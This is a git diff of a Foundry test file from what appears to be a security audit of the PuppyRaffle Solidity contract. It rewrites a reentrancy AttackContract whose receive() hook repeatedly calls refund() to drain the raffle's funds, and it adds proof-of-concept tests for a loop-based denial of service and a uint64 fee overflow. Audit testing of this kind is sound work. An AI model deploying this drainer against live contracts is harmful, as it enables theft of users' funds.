@@ -2,30 +2,32 @@
 pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, console2} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {SafeCast} from '@openzeppelin/contracts/utils/SafeCast.sol';
 
 contract AttackContract {
     PuppyRaffle immutable i_raffle;
     uint256 immutable i_entranceFee;
     address immutable i_player;
+    uint256 index;
 
-    constructor(PuppyRaffle raffle, uint256 entranceFee) {
+    constructor(PuppyRaffle raffle, uint256 entranceFee) payable{
         i_raffle = raffle;
         i_entranceFee = entranceFee;
         i_player = msg.sender;
     }
 
-    function attack(uint256 index) external {
-        if (msg.sender == i_player) {
+    function attack() external {
+            address[] memory newPlayer = new address[](1);
+            newPlayer[0] = address(this);
+            i_raffle.enterRaffle{value: i_entranceFee}(newPlayer);
+            index = i_raffle.getActivePlayerIndex(address(this));
             i_raffle.refund(index);
-        }
     }
 
     receive() external payable {
-        uint256 index = i_raffle.getActivePlayerIndex(address(this));
         if (address(i_raffle).balance >= i_entranceFee) {
-            console.log("Entered here: ", address(this).balance);
             i_raffle.refund(index);
         } else {
             (bool success,) = i_player.call{value: address(this).balance}("");
@@ -102,7 +104,6 @@ contract PuppyRaffleTest is Test {
 
     //@audit-test
     function test_Reverts_DOS_Attack_On_Unbounded_For_Loop(uint64 playersCount) external {
-        // playersCount = bound(playersCount, 4, type(uint64).max); 
         vm.assume(playersCount >= 4 && playersCount <= type(uint64).max);
         address[] memory players = new address[](playersCount);
         for(uint256 i = 0 ; i < playersCount; ++i){
@@ -167,24 +168,13 @@ contract PuppyRaffleTest is Test {
 
     //@audit-test
     function test_Reentrancy_Attack_On_Refund() external playersEntered {
-        address player = makeAddr("Player");
-        uint256 playerInitialBalance = player.balance;
 
         //1. Deploy the attack contract
-        vm.prank(player);
-        AttackContract attackContract = new AttackContract(puppyRaffle, entranceFee);
-        address[] memory newPlayer = new address[](1);
-        newPlayer[0] = address(attackContract);
-        //2. Enter the raffle
-        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
-        //3. Asks for refund.
-        uint256 attackIndex = puppyRaffle.getActivePlayerIndex(address(attackContract));
-        vm.prank(player);
-        attackContract.attack(attackIndex);
+        AttackContract attackContract = new AttackContract{value: entranceFee}(puppyRaffle, entranceFee);
+        attackContract.attack();
 
-        //4. Drains the pool.
+        //2. Drains the pool.
         assertEq(address(puppyRaffle).balance, 0);
-        assertGt(player.balance, playerInitialBalance);
     }
 
     //////////////////////
@@ -311,6 +301,29 @@ contract PuppyRaffleTest is Test {
 
         vm.expectRevert("ERC721: mint to the zero address");
         puppyRaffle.selectWinner();
+    }
+
+    //@audit-test
+    function test_Revert_On_IntegerOverflow() external {
+        address[] memory players = new address[](93);
+        for(uint256 i = 0 ; i < players.length ; i++){
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 93}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        uint256 fee = (players.length * entranceFee * 20) / 100;
+        uint64 totalFee  = uint64(fee);
+        puppyRaffle.selectWinner();
+        assertGt(fee, type(uint64).max, "Fee should overflow uint64");
+        assert(totalFee ==  puppyRaffle.totalFees());
+        // Verify the truncated value matches manual calculation
+        uint64 expectedTotalFee = puppyRaffle.totalFees();
+        uint64 computedFee = uint64(fee - type(uint64).max);
+        assertApproxEqAbs(uint256(computedFee),  expectedTotalFee,1);
+
+
     }
 
     //////////////////////
